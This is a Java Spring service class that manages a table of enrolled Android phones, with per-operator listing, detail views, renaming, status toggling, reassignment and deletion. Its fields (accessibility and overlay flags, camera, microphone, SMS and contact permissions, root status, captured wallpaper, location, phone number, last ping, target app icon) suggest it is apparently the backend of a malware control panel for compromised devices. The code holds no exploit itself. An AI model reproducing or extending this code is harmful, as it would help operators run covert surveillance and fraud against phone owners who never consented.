package com.mm.backend.legacy;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import org.springframework.dao.EmptyResultDataAccessException;
import org.springframework.http.HttpStatus;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.namedparam.MapSqlParameterSource;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.stereotype.Service;

@Service
class LegacyDeviceService {

    private final JdbcTemplate jdbc;
    private final NamedParameterJdbcTemplate namedJdbc;

    LegacyDeviceService(JdbcTemplate jdbc, NamedParameterJdbcTemplate namedJdbc) {
        this.jdbc = jdbc;
        this.namedJdbc = namedJdbc;
    }

    Map<String, Object> listDevices(LegacyUser user, Map<String, Object> input) {
        int page = Math.max(1, RequestData.integer(input, "page", 1));
        int pageSize = Math.min(100, Math.max(1, RequestData.integer(input, "pageSize", 10)));
        int offset = (page - 1) * pageSize;

        StringBuilder where = new StringBuilder(user.isAdmin() ? " WHERE 1 = 1" : " WHERE usrname = :currentUser AND phoneopen = 1");
        MapSqlParameterSource params = new MapSqlParameterSource();
        if (!user.isAdmin()) {
            params.addValue("currentUser", user.usrname());
        }
        likeFilter(where, params, input, "usrname");
        likeFilter(where, params, input, "phone_name");
        likeFilter(where, params, input, "country");
        likeFilter(where, params, input, "model");
        likeFilter(where, params, input, "install_date");
        String accessibility = RequestData.text(input, "accessibility");
        if (!accessibility.isBlank()) {
            where.append(" AND accessibility = :accessibility");
            params.addValue("accessibility", accessibility);
        }

        int total = namedJdbc.queryForObject("SELECT COUNT(*) FROM phones" + where, params, Integer.class);
        params.addValue("limit", pageSize);
        params.addValue("offset", offset);

        List<Map<String, Object>> rows = namedJdbc.queryForList("""
            SELECT
              phone_id AS phone_id,
              usrname AS usrname,
              phone_name AS phone_name,
              android_ver AS android_ver,
              model AS model,
              wallpaper AS wallpaper,
              phonenumber AS phonenumber,
              battery_charg AS battery_charg,
              network AS network,
              install_date AS install_date,
              last_ping AS last_ping,
              address AS address,
              country AS country,
              phoneopen AS phoneopen,
              activities AS activities,
              accessibility AS accessibility
            FROM phones
            """ + where + " ORDER BY install_date DESC, phone_id ASC LIMIT :limit OFFSET :offset", params);

        List<Map<String, Object>> devices = new ArrayList<>();
        for (Map<String, Object> row : rows) {
            Map<String, Object> device = new LinkedHashMap<>(row);
            device.put("wallpaper", legacyWallpaper(RequestData.text(RequestData.value(row, "wallpaper"))));
            devices.add(device);
        }

        Map<String, Object> body = new LinkedHashMap<>();
        body.put("data", devices);
        body.put("total", total);
        body.put("pageCount", (int) Math.ceil(total / (double) pageSize));
        body.put("fileLastModified", null);
        return body;
    }

    Map<String, Object> detail(LegacyUser user, String phoneId) {
        if (phoneId.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("status", "fail", "message", "phone_id is required"));
        }
        Map<String, Object> row = findDevice(phoneId);
        ensureCanAccessDevice(user, row);

        Map<String, Object> device = new LinkedHashMap<>();
        device.put("phone_id", RequestData.value(row, "phone_id"));
        device.put("phonename", RequestData.firstText(row, "phonename", "phone_name"));
        device.put("phonemodel", RequestData.firstText(row, "phonemodel", "model"));
        device.put("phoneandroid", RequestData.firstText(row, "phoneandroid", "android_ver"));
        device.put("phonebattery", RequestData.firstText(row, "phonebattery", "battery_charg"));
        device.put("phoneoperator", RequestData.firstText(row, "phoneoperator", "network"));
        device.put("phonecountry", RequestData.firstText(row, "phonecountry", "country"));
        device.put("phoneip", RequestData.firstText(row, "phoneip", "address"));
        device.put("phonelocation", RequestData.firstText(row, "phonelocation", "address"));
        device.put("phone_status", RequestData.firstText(row, "phone_status", "phoneopen"));
        device.put("install_date", RequestData.value(row, "install_date"));
        device.put("usrname", RequestData.value(row, "usrname"));
        putWithDefault(device, row, "display", "0");
        putWithDefault(device, row, "admin", "0");
        putWithDefault(device, row, "frontcam", "0");
        putWithDefault(device, row, "backcam", "0");
        putWithDefault(device, row, "microphone", "0");
        putWithDefault(device, row, "accessibility", "0");
        putWithDefault(device, row, "notification", "0");
        putWithDefault(device, row, "overlay", "0");
        putWithDefault(device, row, "sms_permission", "0");
        putWithDefault(device, row, "contacts_permission", "0");
        putWithDefault(device, row, "storage_permission", "0");
        putWithDefault(device, row, "call_permission", "0");
        putWithDefault(device, row, "camera_permission", "0");
        putWithDefault(device, row, "location_permission", "0");
        putWithDefault(device, row, "is_rooted", "0");
        putWithDefault(device, row, "screen_resolution", "");
        putWithDefault(device, row, "total_storage", "");
        putWithDefault(device, row, "free_storage", "");
        putWithDefault(device, row, "total_ram", "");
        putWithDefault(device, row, "free_ram", "");
        putWithDefault(device, row, "last_seen", RequestData.value(row, "last_ping"));
        putWithDefault(device, row, "app_name", "");
        putWithDefault(device, row, "app_icon", "");

        return Map.of("status", "success", "device", device);
    }

    Map<String, Object> updateRemark(LegacyUser user, String phoneId, String phoneName) {
        if (phoneId.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("error", "设备ID不能为空"));
        }
        if (phoneName.length() > 50) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("error", "备注最多50个字符"));
        }

        int updated = user.isAdmin()
            ? jdbc.update("UPDATE phones SET phone_name = ? WHERE phone_id = ?", phoneName, phoneId)
            : jdbc.update("UPDATE phones SET phone_name = ? WHERE phone_id = ? AND usrname = ?", phoneName, phoneId, user.usrname());
        if (updated == 0) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("error", "设备未找到"));
        }
        return Map.of("message", "备注修改成功");
    }

    Map<String, Object> toggleStatus(LegacyUser user, String phoneId, int phoneopen) {
        if (phoneId.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("error", "Phone ID is required"));
        }
        int status = phoneopen == 1 ? 1 : 0;
        int updated = user.isAdmin()
            ? jdbc.update("UPDATE phones SET phoneopen = ? WHERE phone_id = ?", status, phoneId)
            : jdbc.update("UPDATE phones SET phoneopen = ? WHERE phone_id = ? AND usrname = ?", status, phoneId, user.usrname());
        if (updated == 0) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("error", "Device not found"));
        }
        return Map.of("message", "Device status updated successfully");
    }

    Map<String, Object> assign(LegacyUser user, String phoneId, String targetUsrname, String targetEmail) {
        if (targetUsrname.isBlank() && targetEmail.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("status", "fail", "message", "usrname or email is required"));
        }
        // phone_id is mandatory — without it, a non-admin user could otherwise call this
        // endpoint to enumerate every user's email by guessing usernames.
        if (phoneId.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("status", "fail", "message", "phone_id is required"));
        }
        if (!user.isAdmin()) {
            String owner = ownerOf(phoneId);
            if (owner == null) {
                throw new ApiException(HttpStatus.NOT_FOUND, Map.of("status", "fail", "message", "Device not found"));
            }
            if (!Objects.equals(owner, user.usrname())) {
                throw new ApiException(HttpStatus.FORBIDDEN, Map.of("status", "fail", "message", "Not your device"));
            }
        }

        Map<String, Object> target = targetUsrname.isBlank()
            ? findUserByEmail(targetEmail)
            : findUserByUsername(targetUsrname);
        if (target == null) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("status", "fail", "message", "User not found"));
        }

        String resolvedUsrname = RequestData.valueText(target, "usrname");
        String resolvedEmail = RequestData.valueText(target, "email");
        int updated = jdbc.update("UPDATE phones SET usrname = ? WHERE phone_id = ?", resolvedUsrname, phoneId);
        if (updated == 0) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("status", "fail", "message", "Device not found"));
        }
        return Map.of("status", "success", "email", resolvedEmail, "message", "Device reassigned");
    }

    Map<String, Object> remove(LegacyUser user, String phoneId) {
        if (phoneId.isBlank()) {
            throw new ApiException(HttpStatus.BAD_REQUEST, Map.of("status", "fail", "message", "phone_id is required"));
        }
        int removed = user.isAdmin()
            ? jdbc.update("DELETE FROM phones WHERE phone_id = ?", phoneId)
            : jdbc.update("DELETE FROM phones WHERE phone_id = ? AND usrname = ?", phoneId, user.usrname());
        if (removed == 0) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("status", "fail", "message", "Device not found"));
        }
        return Map.of("status", "success", "message", "Device deleted successfully");
    }

    private Map<String, Object> findDevice(String phoneId) {
        try {
            return jdbc.queryForMap("SELECT * FROM phones WHERE phone_id = ?", phoneId);
        } catch (EmptyResultDataAccessException exception) {
            throw new ApiException(HttpStatus.NOT_FOUND, Map.of("status", "fail", "message", "Device not found"));
        }
    }

    private String ownerOf(String phoneId) {
        try {
            return jdbc.queryForObject("SELECT usrname FROM phones WHERE phone_id = ? LIMIT 1", String.class, phoneId);
        } catch (EmptyResultDataAccessException exception) {
            return null;
        }
    }

    private Map<String, Object> findUserByUsername(String username) {
        try {
            return jdbc.queryForMap("SELECT usrname, email FROM users WHERE usrname = ? LIMIT 1", username);
        } catch (EmptyResultDataAccessException exception) {
            return null;
        }
    }

    private Map<String, Object> findUserByEmail(String email) {
        try {
            return jdbc.queryForMap("SELECT usrname, email FROM users WHERE email = ? LIMIT 1", email);
        } catch (EmptyResultDataAccessException exception) {
            return null;
        }
    }

    private static void likeFilter(StringBuilder where, MapSqlParameterSource params, Map<String, Object> input, String key) {
        String value = RequestData.text(input, key);
        if (!value.isBlank()) {
            where.append(" AND ").append(key).append(" LIKE :").append(key).append(" ESCAPE '!'");
            params.addValue(key, "%" + escapeLike(value) + "%");
        }
    }

    private static String escapeLike(String value) {
        return value.replace("!", "!!").replace("%", "!%").replace("_", "!_");
    }

    private static void ensureCanAccessDevice(LegacyUser user, Map<String, Object> row) {
        String owner = RequestData.valueText(row, "usrname");
        if (!user.isAdmin() && !Objects.equals(owner, user.usrname())) {
            throw new ApiException(HttpStatus.FORBIDDEN, Map.of("status", "fail", "message", "Access denied"));
        }
    }

    private static void putWithDefault(Map<String, Object> output, Map<String, Object> row, String key, Object fallback) {
        Object value = RequestData.value(row, key);
        output.put(key, value == null ? fallback : value);
    }

    private static String legacyWallpaper(String wallpaper) {
        if (wallpaper.isBlank() || "-1".equals(wallpaper)) {
            return "";
        }
        if (wallpaper.length() > 5 * 1024 * 1024 || wallpaper.length() % 4 != 0) {
            return "";
        }
        if (!wallpaper.matches("^[a-zA-Z0-9/\\r\\n+]*={0,2}$")) {
            return "";
        }
        return "data:image/jpeg;base64," + wallpaper;
    }
}
